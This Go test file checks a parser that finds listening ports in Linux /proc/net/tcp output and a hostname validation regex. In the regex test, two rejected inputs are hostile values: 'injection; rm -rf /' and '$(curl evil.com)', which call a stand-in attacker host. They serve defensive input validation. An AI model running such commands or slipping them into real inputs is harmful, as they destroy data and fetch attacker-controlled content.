package browser

import (
	"testing"
)

// Realistic /proc/net/tcp content from a Linux container.
const testProcNetTCP = `  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:0BB8 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 27894 1 0000000000000000 100 0 0 10 0
   1: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 27895 1 0000000000000000 100 0 0 10 0
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12345 1 0000000000000000 100 0 0 10 0
   3: 0187A8C0:0050 0287A8C0:C350 01 00000000:00000000 02:000000D7 00000000  1000        0 28456 2 0000000000000000 20 4 30 10 -1
   4: 00000000:8000 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 28459 1 0000000000000000 100 0 0 10 0`

func TestParseProcNetTCP(t *testing.T) {
	ports := parseProcNetTCP(testProcNetTCP, 32768, 1024, 65535)

	// Should find listening ports: 3000 (0x0BB8), 8080 (0x1F90)
	// Should exclude: 22 (0x0016, below minPort 1024), ESTABLISHED (state 01), 32768 (>= ephemeral)
	expected := map[int]bool{
		3000: true,
		8080: true,
	}

	found := make(map[int]bool)
	for _, p := range ports {
		found[p] = true
	}

	for port := range expected {
		if !found[port] {
			t.Errorf("expected port %d to be detected, but it wasn't", port)
		}
	}

	// Should NOT include well-known port 22 (below minPort 1024)
	if found[22] {
		t.Error("port 22 (below minPort 1024) should not be included")
	}
	// Should NOT include ESTABLISHED
	if found[80] {
		t.Error("port 80 (ESTABLISHED) should not be included")
	}
	// Should NOT include ephemeral
	if found[32768] {
		t.Error("port 32768 (ephemeral range) should not be included")
	}
}

func TestParseProcNetTCP_WellKnownPortsAllowed(t *testing.T) {
	// When minPort is 1, well-known ports should be included
	ports := parseProcNetTCP(testProcNetTCP, 32768, 1, 65535)

	found := make(map[int]bool)
	for _, p := range ports {
		found[p] = true
	}

	if !found[22] {
		t.Error("port 22 should be included when minPort=1")
	}
	if !found[3000] {
		t.Error("port 3000 should be included")
	}
}

func TestParseProcNetTCP_CustomMaxPort(t *testing.T) {
	// Restrict max port to 5000
	ports := parseProcNetTCP(testProcNetTCP, 32768, 1024, 5000)

	found := make(map[int]bool)
	for _, p := range ports {
		found[p] = true
	}

	if !found[3000] {
		t.Error("port 3000 should be included (within range)")
	}
	if found[8080] {
		t.Error("port 8080 should be excluded (above maxPort 5000)")
	}
}

func TestParseProcNetTCP_Empty(t *testing.T) {
	ports := parseProcNetTCP("", 32768, 1024, 65535)
	if len(ports) != 0 {
		t.Errorf("expected 0 ports for empty input, got %d", len(ports))
	}
}

func TestParseProcNetTCP_HeaderOnly(t *testing.T) {
	ports := parseProcNetTCP("  sl  local_address rem_address   st tx_queue rx_queue\n", 32768, 1024, 65535)
	if len(ports) != 0 {
		t.Errorf("expected 0 ports for header-only input, got %d", len(ports))
	}
}

func TestParseProcNetTCP_NoDuplicates(t *testing.T) {
	data := `  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:0BB8 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 27894 1 0000000000000000 100 0 0 10 0
   1: 00000000:0BB8 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 27895 1 0000000000000000 100 0 0 10 0`

	ports := parseProcNetTCP(data, 32768, 1024, 65535)
	if len(ports) != 1 {
		t.Errorf("expected 1 unique port, got %d: %v", len(ports), ports)
	}
	if ports[0] != 3000 {
		t.Errorf("expected port 3000, got %d", ports[0])
	}
}

func TestValidHostnameRe(t *testing.T) {
	tests := []struct {
		hostname string
		valid    bool
	}{
		{"devcontainer-ws-1", true},
		{"my.container_name", true},
		{"abc123", true},
		{"", false},
		{"-invalid", false},
		{"injection; rm -rf /", false},
		{"$(curl evil.com)", false},
	}
	for _, tt := range tests {
		got := validHostnameRe.MatchString(tt.hostname)
		if got != tt.valid {
			t.Errorf("validHostnameRe(%q) = %v, want %v", tt.hostname, got, tt.valid)
		}
	}
}
